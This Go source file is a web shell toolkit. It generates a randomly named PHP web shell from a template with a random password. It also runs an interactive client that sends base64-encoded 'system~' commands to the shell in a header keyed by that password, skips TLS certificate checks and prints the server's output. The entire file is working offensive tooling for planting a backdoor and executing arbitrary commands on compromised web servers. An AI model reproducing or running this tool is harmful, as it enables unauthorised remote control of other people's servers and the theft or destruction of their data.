package main

import (
	"bufio"
	"crypto/tls"
	"encoding/base64"
	"flag"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strings"
	"text/template"

	"gopkg.in/yaml.v3"
)

type CustomCommands map[string]string

type Rand struct {
	RandVar  string
	RandPass string
}

func RandString(n int) string {
	const alphanum = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	var bytes = make([]byte, n)
	for i := range bytes {
		bytes[i] = alphanum[rand.Intn(len(alphanum))]
	}
	return string(bytes)
}

func GetHostname(address string) string {
	url, err := url.Parse(address)
	if err != nil {
		log.Fatalf("Invalid url %v", err)
	}
	hostname := strings.TrimPrefix(url.Hostname(), "www.")

	return hostname
}

func Requester(url string, cmd string, password string) string {
	var bases = []rune{'T', 'w', 'F', 'v', 'Z', 'n'}

	payload := fmt.Sprintf("%s%s", string(bases[rand.Intn(len(bases))]),
		base64.StdEncoding.EncodeToString([]byte(fmt.Sprintf("system~%s", cmd))))

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}

	req, _ := http.NewRequest("GET", url, nil)

	req.Header = http.Header{
		"Host":       {GetHostname(url)},
		"User-Agent": {""},
		password:     {payload},
	}

	resp, err := client.Do(req)
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()

	bodyText, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Fatal(err)
	}
	if string(bodyText[:5]) == "Array" {
		bodyText = bodyText[5:]
	}
	return string(bodyText)
}

func readCustomCommands(filename string) (CustomCommands, error) {
	var commands CustomCommands
	yamlFile, err := os.ReadFile(filename)
	if err != nil {
		return nil, err
	}
	err = yaml.Unmarshal(yamlFile, &commands)
	if err != nil {
		return nil, err
	}
	return commands, nil
}

func checkCustom(cmd string, customCommands CustomCommands) string {
	if cmd == ":\n" || cmd == ":exit\n" {
		os.Exit(0)
	} else if cmd == ":cls\n" || cmd == ":clear\n" {
		fmt.Printf("\x1bc")
		return ""
	} else if custom, ok := customCommands[cmd]; ok {
		return custom
	}
	return cmd
}

func main() {
	t := flag.String("t", "templates/ninja.webshell", "a string")
	handler := flag.String("handler", "", "a string")
	gen := flag.Bool("gen", false, "a boolean")
	raw := flag.Bool("raw", false, "a boolean")
	flag.Parse()

	customCommands, err := readCustomCommands("custom_commands.yaml")
	if err != nil {
		fmt.Println("Error loading custom commands:", err)
		os.Exit(1)
	}

	if *handler != "" {
		var password string
		fmt.Printf("🔑 Password > ")
		fmt.Scan(&password)

		for {
			fmt.Printf("🥷 > ")
			in := bufio.NewReader(os.Stdin)
			cmd, _ := in.ReadString('\n')
			cmd = checkCustom(cmd, customCommands)
			if cmd != "" {
				resp := Requester(*handler, cmd, password)
				println(resp)
			}
		}
	}

	if *gen {
		template, err := template.ParseFiles(*t)
		if err != nil {
			log.Fatalln(err)
		}
		data := Rand{RandVar: RandString(10), RandPass: RandString(20)}
		if *raw {
			template.Execute(os.Stdout, data)
			os.Exit(0)
		}
		fmt.Printf("🔑 Password > %s \n", data.RandPass)

		f, err := os.Create(fmt.Sprintf("%s.php", data.RandVar))
		if err != nil {
			log.Fatal(err)
		}
		defer f.Close()
		template.Execute(f, data)
	}
}
